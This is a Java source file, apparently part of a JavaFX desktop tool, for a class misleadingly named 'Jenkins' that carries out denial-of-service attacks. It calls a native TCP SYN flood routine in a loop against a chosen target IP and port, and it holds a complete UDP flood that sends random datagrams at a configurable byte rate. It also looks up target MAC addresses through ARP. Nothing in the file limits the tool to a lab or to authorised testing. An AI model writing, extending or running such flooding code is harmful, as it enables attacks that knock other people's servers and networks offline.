package com.yourpackage;

import javafx.scene.control.TextArea;
import javafx.application.Platform;
import java.util.logging.Logger;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.net.NetworkInterface;
import java.net.InetAddress;
import org.jnetpcap.*;
import org.jnetpcap.packet.*;
import org.jnetpcap.packet.format.*;
import org.jnetpcap.protocol.*;
import org.jnetpcap.protocol.network.*;
import org.jnetpcap.protocol.tcpip.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.ByteOrder;
import java.net.DatagramSocket;
import java.net.DatagramPacket;

public class Jenkins {
    private static final Logger logger = Logger.getLogger(Jenkins.class.getName());
    private TextArea logArea;
    private volatile boolean stopAttack = false;
    private String sourceIp;
    private byte[] sourceMac;

    // Native method declaration
    static {
        System.out.println("java.library.path: " + System.getProperty("java.library.path"));
        try {
            System.loadLibrary("tcpsynflood");
            System.out.println("tcpsynflood library loaded successfully");
        } catch (UnsatisfiedLinkError e) {
            System.err.println("Failed to load tcpsynflood library: " + e.getMessage());
            e.printStackTrace();
        }
    }

    public native boolean nativeTcpSynFlood(
        String sourceIp,
        String sourceMac,
        String destIp,
        String destMac,
        int destPort,
        long bytesPerSecond
    );

    public void resetAttack() {
        stopAttack = false;
    }

    public void tcpSynFlood(String targetIp, int targetPort, long targetBytesPerSecond, Runnable updateChart) {
        // Implementation of tcpSynFlood method
        new Thread(() -> {
            long startTime = System.currentTimeMillis();
            while (!stopAttack) {
                // Perform the attack
                nativeTcpSynFlood(sourceIp, bytesToMacString(sourceMac), targetIp, "00-00-00-00-00-00", targetPort, targetBytesPerSecond);
                long currentTime = System.currentTimeMillis();
                double elapsedTimeSeconds = (currentTime - startTime) / 1000.0;
                double actualMbps = targetBytesPerSecond * 8.0 / 1_000_000.0; // Convert bytes/sec to Mbps
                Platform.runLater(() -> updateChart.run());
            }
        }).start();
    }

    public void stopAttack() {
        stopAttack = true;
    }

    public void setSourceIp(String sourceIp) {
        this.sourceIp = sourceIp;
    }

    public void setSourceMac(byte[] sourceMac) {
        this.sourceMac = sourceMac;
    }

    private String bytesToMacString(byte[] mac) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < mac.length; i++) {
            sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
        }
        return sb.toString();
    }

    // Method to log a message
    private void log(String message) {
        logger.info(message);
        if (logArea != null) {
            Platform.runLater(() -> {
                logArea.appendText(LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")) 
                    + " - " + message + "\n");
            });
        }
    }

    public String getMacAddress(String ipAddress) {
        try {
            InetAddress addr = InetAddress.getByName(ipAddress);
            
            // Try ARP for all addresses
            String[] cmd;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                cmd = new String[]{"arp", "-a", ipAddress};
            } else {
                cmd = new String[]{"arp", ipAddress};
            }
            
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains(ipAddress)) {
                    String[] parts = line.split("\\s+");
                    for (String part : parts) {
                        if (part.matches("([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})")) {
                            return part.toUpperCase();
                        }
                    }
                }
            }
            
            // If ARP fails, try NetworkInterface for local addresses
            if (addr.isLinkLocalAddress() || addr.isSiteLocalAddress()) {
                NetworkInterface ni = NetworkInterface.getByInetAddress(addr);
                if (ni != null) {
                    byte[] mac = ni.getHardwareAddress();
                    if (mac != null) {
                        return formatMacAddress(mac);
                    }
                }
            }
            
            return "MAC address not found";
        } catch (Exception e) {
            e.printStackTrace();
            return "Error: " + e.getMessage();
        }
    }

    private String formatMacAddress(byte[] mac) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < mac.length; i++) {
            sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? ":" : ""));
        }
        return sb.toString();
    }

    // Assume getDestinationMacAddress is implemented elsewhere
    private byte[] getDestinationMacAddress(InetAddress targetAddress) {
        // Implementation goes here
        return null; // Placeholder
    }

    // Setter for logArea
    public void setLogArea(TextArea logArea) {
        this.logArea = logArea;
    }

    // Other methods...
    public void udpFlood(String targetIp, int targetPort, long targetBytesPerSecond, Runnable updateChart) {
        new Thread(() -> {
            long startTime = System.currentTimeMillis();
            while (!stopAttack) {
                try {
                    InetAddress address = InetAddress.getByName(targetIp);
                    byte[] buffer = new byte[1024];
                    java.util.Random random = new java.util.Random();
                    random.nextBytes(buffer);

                    DatagramSocket socket = new DatagramSocket();
                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, targetPort);

                    long packetsSent = 0;
                    long bytesSent = 0;
                    long intervalStart = System.currentTimeMillis();

                    while (bytesSent < targetBytesPerSecond && !stopAttack) {
                        socket.send(packet);
                        packetsSent++;
                        bytesSent += buffer.length;

                        if (System.currentTimeMillis() - intervalStart >= 1000) {
                            double elapsedTimeSeconds = (System.currentTimeMillis() - startTime) / 1000.0;
                            double actualMbps = bytesSent * 8.0 / 1_000_000.0;
                            Platform.runLater(() -> updateChart.run());
                            intervalStart = System.currentTimeMillis();
                            bytesSent = 0;
                        }
                    }

                    socket.close();
                } catch (Exception e) {
                    log("Error in UDP flood: " + e.getMessage());
                }
            }
        }).start();
    }
}